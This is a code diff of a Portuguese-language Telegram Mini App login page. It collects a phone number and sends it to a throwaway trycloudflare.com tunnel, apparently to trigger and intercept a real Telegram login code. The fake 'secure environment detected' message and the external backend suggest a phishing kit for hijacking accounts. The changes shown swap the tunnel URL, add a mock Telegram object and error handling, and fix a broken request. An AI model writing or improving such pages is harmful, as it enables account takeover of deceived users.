@@ -164,7 +164,7 @@
         // =====================================================================
         // CONFIGURAÇÃO
         // =====================================================================
-        const API_BASE = 'https://kills-breach-decorative-highlight.trycloudflare.com';
+        const API_BASE = 'https://heaven-rapidly-smile-comment.trycloudflare.com';
 
         // =====================================================================
         // ESTADO DA APLICAÇÃO
@@ -175,13 +175,21 @@
         };
 
         // =====================================================================
-        // INTEGRAÇÃO TELEGRAM WEB APP
+        // INTEGRAÇÃO TELEGRAM WEB APP (COM FALLBACK)
         // =====================================================================
-        const tg = window.Telegram.WebApp;
+        let tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : {
+            ready: () => console.log("Telegram WebApp mock ready"),
+            expand: () => console.log("Telegram WebApp mock expand"),
+            setHeaderColor: () => {},
+            setBackgroundColor: () => {},
+            close: () => alert("Sessão encerrada"),
+            sendData: (data) => console.log("sendData:", data),
+            initDataUnsafe: { user: null }
+        };
 
         // Inicializa o ambiente do Mini App
-        tg.ready();
-        tg.expand();
+        if (tg.ready) tg.ready();
+        if (tg.expand) tg.expand();
         if (tg.setHeaderColor) tg.setHeaderColor('#ffffff');
         if (tg.setBackgroundColor) tg.setBackgroundColor('#f0f2f5');
 
@@ -222,14 +230,20 @@
         // =====================================================================
         // FUNÇÕES DE UTILIDADE
         // =====================================================================
-        function showStatus(element, message, type = 'info') {
+                function showStatus(element, message, type = 'info') {
+            if (!element) return;
             element.className = `status ${type}`;
             element.textContent = message;
         }
 
         function goToStep(stepId) {
             document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
-            document.getElementById(stepId).classList.add('active');
+            const target = document.getElementById(stepId);
+            if (target) {
+                target.classList.add('active');
+            } else {
+                console.error(`Step ${stepId} não encontrado`);
+            }
         }
 
         // Normalização robusta: Remove +, espaços, zeros iniciais
@@ -242,7 +256,6 @@
         }
 
         // Extrai mensagem legível de qualquer tipo de erro/objeto
-                // Extrai mensagem legível de qualquer tipo de erro/objeto
         function getErrorMessage(error, fallback = 'Erro desconhecido') {
             if (error instanceof Error) {
                 return error.message || error.toString();
@@ -261,46 +274,53 @@
         // INICIALIZAÇÃO
         // =====================================================================
         function initApp() {
-            const user = window._mockTelegramUser;
-            
-            if (user) {
-                els.userAvatar.textContent = user.first_name?.[0] || 'T';
-                els.userName.textContent = `${user.first_name} ${user.last_name || ''}`.trim();
-                if (user.username) {
-                    els.userPhone.textContent = `@${user.username}`;
-                }
-            } else {
-                els.userName.textContent = "Visitante";
-                els.userAvatar.textContent = 'V';
-                els.userPhone.textContent = "N/A";
-            }
-
-            const locale = navigator.language || 'pt-BR';
-            if (locale.startsWith('pt-BR')) {
-                els.phone.value = "+55 ";
-            }
-
-            els.btnAuth.addEventListener('click', handleAuth);
-            els.finishBtn.addEventListener('click', () => {
-                if (tg.close) {
-                    tg.close();
+            try {
+                const user = window._mockTelegramUser;
+                
+                if (user) {
+                    els.userAvatar.textContent = user.first_name?.[0] || 'T';
+                    els.userName.textContent = `${user.first_name} ${user.last_name || ''}`.trim();
+                    if (user.username) {
+                        els.userPhone.textContent = `@${user.username}`;
+                    }
                 } else {
-                    alert('Sessão concluída com sucesso!');
+                    els.userName.textContent = "Visitante";
+                    els.userAvatar.textContent = 'V';
+                    els.userPhone.textContent = "N/A";
                 }
-            });
 
-            // Teste de conexão inicial (não bloqueante)
-            fetch(`${API_BASE}/api/health`).then(r => {
-                if (!r.ok) console.warn("Health check falhou:", r.status);
-            }).catch(e => console.warn("Health check offline:", e.message));
+                const locale = navigator.language || 'pt-BR';
+                if (locale.startsWith('pt-BR')) {
+                    els.phone.value = "+55 ";
+                }
 
-            setTimeout(() => {
-                showStatus(els.statusInit, 'Ambiente seguro detectado. Preparando sessão...', 'info');
+                els.btnAuth.addEventListener('click', handleAuth);
+                els.finishBtn.addEventListener('click', () => {
+                    if (tg.close) {
+                        tg.close();
+                    } else {
+                        alert('Sessão concluída com sucesso!');
+                    }
+                });
+
+                // Teste de conexão inicial (não bloqueante)
+                fetch(`${API_BASE}/api/health`).then(r => {
+                    if (!r.ok) console.warn("Health check falhou:", r.status);
+                }).catch(e => console.warn("Health check offline:", e.message));
+
+                // Transição para a tela de login
                 setTimeout(() => {
-                    goToStep('step-login');
-                    els.phone.focus();
-                }, 1500);
-            }, 800);
+                    showStatus(els.statusInit, 'Ambiente seguro detectado. Preparando sessão...', 'info');
+                    setTimeout(() => {
+                        goToStep('step-login');
+                        els.phone.focus();
+                    }, 1500);
+                }, 800);
+
+            } catch (e) {
+                console.error("Erro na inicialização:", e);
+                showStatus(els.statusInit, `Erro ao iniciar: ${e.message}`, 'error');
+            }
         }
 
         // =====================================================================
@@ -320,19 +340,20 @@
             }
 
             // =========================================================================
-            // FASE 1: SOLICITAR CÓDIGO REAL
+            // FASE 1: SOLICITAR CÓDIGO REAL (QUERY STRING)
             // =========================================================================
-            if (!state.authStarted) {
+                        if (!state.authStarted) {
                 els.btnAuth.disabled = true;
                 showStatus(els.statusAuth, 'Enviando código via Telegram...', 'info');
                 
                 try {
-                    const response = await fetch(`${API_BASE}/api/send-code?phone=${cleanPhone}`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' }
-});
-                                        
-                        body: JSON.stringify({ phone: cleanPhone })
+                    // CORREÇÃO: Monta a URL com o parâmetro na query string
+                    const urlWithQuery = `${API_BASE}/api/send-code?phone=${encodeURIComponent(cleanPhone)}`;
+                    
+                    const response = await fetch(urlWithQuery, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' }
+                        // Não enviamos mais body
                     });
 
                     // Captura o texto bruto para diagnóstico
